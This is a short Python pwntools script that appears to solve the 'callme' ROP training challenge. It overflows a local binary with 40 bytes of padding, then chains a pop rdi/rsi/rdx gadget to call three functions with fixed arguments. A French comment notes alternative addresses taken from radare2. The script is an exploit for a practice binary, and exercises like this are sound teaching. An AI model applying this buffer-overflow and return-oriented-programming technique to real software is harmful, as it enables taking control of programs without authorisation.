#!/usr/bin/python3 


from pwn import *

elf = context.binary = ELF('callme')
info("%#x callme_one", elf.symbols.callme_one)
callme_one = p64(elf.symbols.callme_one)
callme_two = p64(elf.symbols.callme_two)
callme_three = p64(elf.symbols.callme_three)

# Fonctionne aussi avec les adresses dump√©es par r2
#0x004006f0    1 6            sym.imp.callme_three
#0x00400740    1 6            sym.imp.callme_two
#0x00400720    1 6            sym.imp.callme_one
callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)

offset_padding = 40
arg1    = p64(0xdeadbeefdeadbeef) 
arg2    = p64(0xcafebabecafebabe)
arg3    = p64(0xd00df00dd00df00d)
pop_rdi_rsi_rdx_gadget = p64(0x000000000040093c)

payload = b'A'*offset_padding + pop_rdi_rsi_rdx_gadget + arg1 + arg2 + arg3 + callme_one \
                              + pop_rdi_rsi_rdx_gadget + arg1 + arg2 + arg3 + callme_two \
                              + pop_rdi_rsi_rdx_gadget + arg1 + arg2 + arg3 + callme_three

io = process(elf.path)
io.sendline(payload)
io.interactive()
while 1:
    try:
        print(io.recvline().decode())
    except:
        exit()
